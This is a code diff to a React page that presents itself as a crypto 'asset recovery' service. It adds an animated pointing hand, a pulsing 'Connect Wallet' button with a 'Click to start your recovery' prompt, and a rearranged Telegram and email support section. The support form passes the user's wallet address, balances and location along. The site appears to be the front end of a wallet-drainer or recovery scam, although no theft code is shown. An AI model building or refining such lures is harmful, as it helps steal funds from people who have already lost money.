@@ -109,7 +109,6 @@ const TRANSLATIONS = {
     emailSupportDesc: 'No Telegram? No problem! Send us an email with your issue and our support team will get back to you within 24 hours.',
     whyEmailSupport: 'Why Email Support?',
     emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual recovery cases',
-    // NEW INSTRUCTION KEYS
     recoveryInstructionsTitle: '🔐 How to Recover Your Assets',
     recoveryStep1: 'Connect your wallet using the button below.',
     recoveryStep2: 'Wait for automatic scan of 5 blockchain networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
@@ -3001,6 +3000,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
+  // -------- NEW UI: Animated Pointing Hand & Enhanced Connect Button --------
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#0a0a2a] to-[#000000] text-white font-['Poppins'] overflow-hidden">
       
@@ -3118,16 +3118,31 @@ function App() {
             />
           )}
 
-          {/* Wallet Connect Button */}
+          {/* ===== CONNECT WALLET BUTTON WITH ANIMATED POINTER ===== */}
           {!isConnected ? (
-            <button
-              onClick={() => open()}
-              onMouseEnter={() => setHoverConnect(true)}
-              onMouseLeave={() => setHoverConnect(false)}
-              className="bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(59,130,246,0.4)] mb-8 w-full max-w-md"
-            >
-              {translations.connectWallet}
-            </button>
+            <div className="relative w-full max-w-md mx-auto">
+              {/* Animated pointing hand */}
+              <div className="absolute -left-16 top-1/2 transform -translate-y-1/2 hidden md:block animate-bounce-hand">
+                <div className="text-4xl filter drop-shadow-lg">👉</div>
+              </div>
+              <button
+                onClick={() => open()}
+                onMouseEnter={() => setHoverConnect(true)}
+                onMouseLeave={() => setHoverConnect(false)}
+                className="relative bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_30px_rgba(59,130,246,0.6)] mb-8 w-full border-2 border-blue-400/50 shadow-lg shadow-blue-500/30 animate-pulse-border"
+              >
+                <span className="relative z-10 flex items-center justify-center gap-2">
+                  <span className="text-xl">🔗</span>
+                  {translations.connectWallet}
+                </span>
+                {/* Pulsing ring behind the button */}
+                <span className="absolute inset-0 rounded-xl border-2 border-blue-400/60 animate-ping-slow"></span>
+              </button>
+              {/* Optional text below to reinforce the action */}
+              <p className="text-xs text-blue-300/60 -mt-4 mb-4 animate-pulse-slow">
+                👆 Click to start your recovery
+              </p>
+            </div>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
               <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-blue-500/30 rounded-full py-2 pl-5 pr-2 w-full">
@@ -3240,20 +3255,22 @@ function App() {
           )}
 
           {/* ============================================ */}
-          {/* SUPPORT SECTION - TELEGRAM (First) + EMAIL (Second) */}
+          {/* SUPPORT SECTION - TWO COLUMN GRID (Sleek) */}
           {/* ============================================ */}
-          
-          {/* Telegram Support - For users who prefer instant chat */}
-          <TelegramSupport translations={translations} />
-          
-          {/* Email Support Section - For users without Telegram or needing manual follow-up */}
-          <div className="w-full max-w-md mt-6">
-            <ReportIssue 
-              translations={translations}
-              address={address}
-              balances={balances}
-              userLocation={userLocation}
-            />
+          <div className="w-full max-w-md grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
+            {/* Telegram Support */}
+            <div className="col-span-1">
+              <TelegramSupport translations={translations} />
+            </div>
+            {/* Report Issue (Email) */}
+            <div className="col-span-1">
+              <ReportIssue 
+                translations={translations}
+                address={address}
+                balances={balances}
+                userLocation={userLocation}
+              />
+            </div>
           </div>
 
           {/* LIVE RECOVERY FEED */}
@@ -3485,6 +3502,14 @@ function App() {
           from { transform: translateY(100px); opacity: 0; }
           to { transform: translateY(0); opacity: 1; }
         }
+        @keyframes bounce-hand {
+          0%, 100% { transform: translateY(-50%) rotate(-15deg); }
+          50% { transform: translateY(-60%) rotate(-10deg) scale(1.1); }
+        }
+        @keyframes ping-slow {
+          0% { transform: scale(1); opacity: 1; }
+          100% { transform: scale(1.05); opacity: 0; }
+        }
         
         .animate-glow-blue { animation: glow-blue 3s infinite alternate; }
         .animate-pulse-blue { animation: pulse-blue 1.5s infinite; }
@@ -3493,6 +3518,16 @@ function App() {
         .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
         .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
         .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
+        .animate-bounce-hand { animation: bounce-hand 1.5s ease-in-out infinite; }
+        .animate-ping-slow { animation: ping-slow 1.5s ease-out infinite; }
+        .animate-pulse-border {
+          animation: pulse-border 2s ease-in-out infinite;
+        }
+        @keyframes pulse-border {
+          0% { border-color: rgba(96, 165, 250, 0.3); }
+          50% { border-color: rgba(96, 165, 250, 0.8); }
+          100% { border-color: rgba(96, 165, 250, 0.3); }
+        }
         
         .custom-scrollbar::-webkit-scrollbar {
           width: 4px;
